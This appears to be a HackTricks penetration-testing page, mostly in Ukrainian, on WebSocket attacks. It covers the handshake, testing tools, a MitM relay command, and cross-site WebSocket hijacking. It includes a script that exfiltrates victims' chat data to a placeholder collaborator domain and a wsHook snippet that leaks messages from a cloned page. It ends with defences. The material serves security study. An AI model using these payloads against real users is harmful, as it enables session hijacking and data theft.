# WebSocket Attacks

{{#include ../banners/hacktricks-training.md}}

## Що таке WebSockets

З'єднання WebSocket встановлюються через початковий **HTTP** рукопашний handshake і призначені для **тривалого використання**, що дозволяє двостороннє повідомлення в будь-який час без необхідності в транзакційній системі. Це робить WebSockets особливо вигідними для додатків, які вимагають **низької затримки або ініційованого сервером зв'язку**, таких як потоки фінансових даних в реальному часі.

### Встановлення з'єднань WebSocket

Детальне пояснення щодо встановлення з'єднань WebSocket можна знайти [**тут**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc). Підсумовуючи, з'єднання WebSocket зазвичай ініціюються за допомогою JavaScript на стороні клієнта, як показано нижче:
```javascript
var ws = new WebSocket("wss://normal-website.com/ws")
```
Протокол `wss` позначає з'єднання WebSocket, захищене **TLS**, тоді як `ws` вказує на **незахищене** з'єднання.

Під час встановлення з'єднання виконується обмін повідомленнями між браузером і сервером через HTTP. Процес обміну повідомленнями включає в себе надсилання запиту браузером і відповідь сервера, як показано в наступних прикладах:

Браузер надсилає запит на обмін повідомленнями:
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
Відповідь на хендшейк сервера:
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
З'єднання залишається відкритим для обміну повідомленнями в обох напрямках після встановлення.

**Ключові моменти рукостискання WebSocket:**

- Заголовки `Connection` та `Upgrade` сигналізують про ініціацію рукостискання WebSocket.
- Заголовок `Sec-WebSocket-Version` вказує на бажану версію протоколу WebSocket, зазвичай `13`.
- У заголовку `Sec-WebSocket-Key` надсилається випадкове значення, закодоване в Base64, що забезпечує унікальність кожного рукостискання, що допомагає запобігти проблемам з кешуючими проксі. Це значення не призначене для аутентифікації, а для підтвердження того, що відповідь не згенерована неправильно налаштованим сервером або кешем.
- Заголовок `Sec-WebSocket-Accept` у відповіді сервера є хешем `Sec-WebSocket-Key`, що підтверджує намір сервера відкрити з'єднання WebSocket.

Ці функції забезпечують безпечний і надійний процес рукостискання, прокладаючи шлях для ефективної комунікації в реальному часі.

### Linux console

Ви можете використовувати `websocat` для встановлення сирого з'єднання з websocket.
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
Або для створення сервера websocat:
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### MitM websocket connections

Якщо ви виявите, що клієнти підключені до **HTTP websocket** з вашої поточної локальної мережі, ви можете спробувати [ARP Spoofing Attack](../generic-methodologies-and-resources/pentesting-network/index.html#arp-spoofing), щоб виконати атаку MitM між клієнтом і сервером.\
Якщо клієнт намагається підключитися, ви можете використовувати:
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Websockets enumeration

Ви можете використовувати **tool** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **для автоматичного виявлення, ідентифікації та пошуку відомих** **вразливостей** у вебсокетах.

### Websocket Debug tools

- **Burp Suite** підтримує MitM вебсокетну комунікацію дуже схожим чином, як це робить для звичайної HTTP-комунікації.
- Розширення [**socketsleuth**](https://github.com/snyk/socketsleuth) **для Burp Suite** дозволить вам краще керувати вебсокетними комунікаціями в Burp, отримуючи **історію**, встановлюючи **правила перехоплення**, використовуючи **правила збігу та заміни**, використовуючи **Intruder** та **AutoRepeater.**
- [**WSSiP**](https://github.com/nccgroup/wssip)**:** Скорочено від "**WebSocket/Socket.io Proxy**", цей інструмент, написаний на Node.js, надає інтерфейс для **захоплення, перехоплення, надсилання користувацьких** повідомлень та перегляду всіх вебсокетних і Socket.IO комунікацій між клієнтом і сервером.
- [**wsrepl**](https://github.com/doyensec/wsrepl) є **інтерактивним вебсокетним REPL**, спеціально розробленим для тестування на проникнення. Він надає інтерфейс для спостереження за **вхідними вебсокетними повідомленнями та надсилання нових**, з простим у використанні фреймворком для **автоматизації** цієї комунікації.
- [**https://websocketking.com/**](https://websocketking.com/) це **веб для комунікації** з іншими вебами, використовуючи **вебсокети**.
- [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) серед інших типів комунікацій/протоколів, надає **веб для комунікації** з іншими вебами, використовуючи **вебсокети.**

## Decrypting Websocket

- [https://github.com/Anof-cyber/PyCript](https://github.com/Anof-cyber/PyCript)
- [https://github.com/Anof-cyber/PyCript-WebSocket/](https://github.com/Anof-cyber/PyCript-WebSocket/)

## Websocket Lab

У [**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) у вас є код для запуску вебу, використовуючи вебсокети, а в [**цьому пості**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) ви можете знайти пояснення.

## Websocket Fuzzing

Розширення burp [**Backslash Powered Scanner**](https://github.com/PortSwigger/backslash-powered-scanner) тепер також дозволяє фуззити вебсокетні повідомлення. Ви можете прочитати більше інформації про це [**тут**](https://arete06.com/posts/fuzzing-ws/#adding-websocket-support-to-backslash-powered-scanner).

## Cross-site WebSocket hijacking (CSWSH)

**Перехоплення вебсокетів між сайтами**, також відоме як **перехоплення вебсокетів з різних джерел**, визначається як специфічний випадок **[Cross-Site Request Forgery (CSRF)](csrf-cross-site-request-forgery.md)**, що впливає на вебсокетні з'єднання. Ця вразливість виникає, коли вебсокетні з'єднання аутентифікуються виключно через **HTTP cookies** без **CSRF токенів** або подібних заходів безпеки.

Зловмисники можуть скористатися цим, розмістивши **шкідливу веб-сторінку**, яка ініціює міжсайтове вебсокетне з'єднання з вразливою програмою. В результаті це з'єднання розглядається як частина сесії жертви з програмою, експлуатуючи відсутність захисту CSRF у механізмі обробки сесій.

Для того, щоб ця атака спрацювала, необхідні такі умови:

- Аутентифікація вебсокета **повинна базуватися на cookie**
- Cookie повинна бути доступною з сервера зловмисника (це зазвичай означає **`SameSite=None`**) і не повинно бути **Firefox Total Cookie Protection** увімкнено в Firefox та не повинно бути **блокованих сторонніх cookie** в Chrome.
- Вебсокетний сервер не повинен перевіряти походження з'єднання (або це повинно бути обхідним)

Також:

- Якщо аутентифікація базується на локальному з'єднанні (до localhost або до локальної мережі), атака **буде можливою**, оскільки жоден поточний захист не забороняє цього (перевірте [більше інформації тут](https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/))

### Simple Attack

Зверніть увагу, що при **встановленні** **вебсокетного** з'єднання **cookie** **надсилається** на сервер. **Сервер** може використовувати його для **пов'язування** кожного **конкретного** **користувача** з його **вебсокетною** **сесією на основі надісланого cookie**.

Тоді, якщо, наприклад, **вебсокетний** **сервер** **повертає історію розмови** користувача, якщо надіслати повідомлення з "**READY"**, тоді **проста XSS**, що встановлює з'єднання ( **cookie** буде **надіслано** **автоматично** для авторизації жертви) **надсилаючи** "**READY**" зможе **отримати** історію **розмови**.
```html
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### Cross Origin + Cookie with a different subdomain

У цьому блозі [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/) зловмисник зміг **виконати довільний Javascript у піддомені** домену, де відбувалася комунікація через веб-сокети. Оскільки це був **піддомен**, **кукі** надсилалися, і оскільки **Websocket не перевіряв Origin належним чином**, було можливим спілкуватися з ним і **викрасти токени**.

### Stealing data from user

Скопіюйте веб-додаток, який ви хочете наслідувати (файли .html, наприклад), і всередині скрипта, де відбувається комунікація через веб-сокети, додайте цей код:
```javascript
//This is the script tag to load the websocket hooker
;<script src="wsHook.js"></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function (data, url) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "client_msg?m=" + data, true)
xhttp.send()
}
wsHook.after = function (messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "server_msg?m=" + messageEvent.data, true)
xhttp.send()
return messageEvent
}
```
Тепер завантажте файл `wsHook.js` з [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) і **збережіть його в папці з веб-файлами**.\
Відкриваючи веб-додаток і змушуючи користувача підключитися до нього, ви зможете вкрасти надіслані та отримані повідомлення через websocket:
```javascript
sudo python3 -m http.server 80
```
### CSWSH Захисти

Атака CSWSH базується на тому, що **користувач підключиться до шкідливої сторінки**, яка **відкриє вебсокетне з'єднання** до веб-сторінки, до якої користувач вже підключений, і аутентифікує його, оскільки запит надішле куки користувача.

Сьогодні дуже легко запобігти цій проблемі:

- **Перевірка походження вебсокетного сервера**: Вебсокетний сервер завжди повинен перевіряти, звідки підключається користувач, щоб запобігти підключенню несподіваних сторінок.
- **Токен аутентифікації**: Замість того, щоб базувати аутентифікацію на куках, вебсокетне з'єднання може базуватися на токені, який генерується сервером для користувача, невідомого зловмиснику (як токен проти CSRF).
- **Атрибут куки SameSite**: Куки з значенням `SameSite` як `Lax` або `Strict` не будуть надіслані з зовнішньої сторінки зловмисника на сервер жертви, отже, аутентифікація на основі куків не буде успішною. Зверніть увагу, що Chrome тепер встановлює значення **`Lax`** для куків без цього прапора, роблячи це більш безпечним за замовчуванням. Хоча, протягом перших 2 хвилин після створення куки вона матиме значення **`None`**, що робить її вразливою протягом цього обмеженого періоду часу (також очікується, що цей захід буде видалено в якийсь момент).
- **Загальний захист куків Firefox**: Загальний захист куків працює, ізолюючи куки на сайті, на якому вони створені. По суті, кожен сайт має своє власне сховище куків, щоб запобігти третім особам пов'язувати історію перегляду користувача. Це робить **CSWSH непридатним**, оскільки сайт зловмисника не матиме доступу до куків.
- **Блокування сторонніх куків у Chrome**: Це також може запобігти надсиланню куки аутентифікованого користувача на вебсокетний сервер, навіть з `SameSite=None`.

## Умови гонки

Умови гонки у WebSockets також існують, [перевірте цю інформацію, щоб дізнатися більше](race-condition.md#rc-in-websockets).

## Інші вразливості

Оскільки вебсокети є механізмом для **надсилання даних на серверну та клієнтську сторони**, залежно від того, як сервер і клієнт обробляють інформацію, **вебсокети можуть бути використані для експлуатації кількох інших вразливостей, таких як XSS, SQLi або будь-яка інша загальна веб-вразливість, використовуючи введення користувача з вебсокета.**

## **WebSocket Смуглінг**

Ця вразливість може дозволити вам **обійти обмеження зворотних проксі**, змушуючи їх вірити, що **вебсокетне спілкування було встановлено** (навіть якщо це не так). Це може дозволити зловмиснику **отримати доступ до прихованих кінцевих точок**. Для отримання додаткової інформації перегляньте наступну сторінку:

{{#ref}}
h2c-smuggling.md
{{#endref}}

## Посилання

- [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)
- [https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/](https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/)

{{#include ../banners/hacktricks-training.md}}
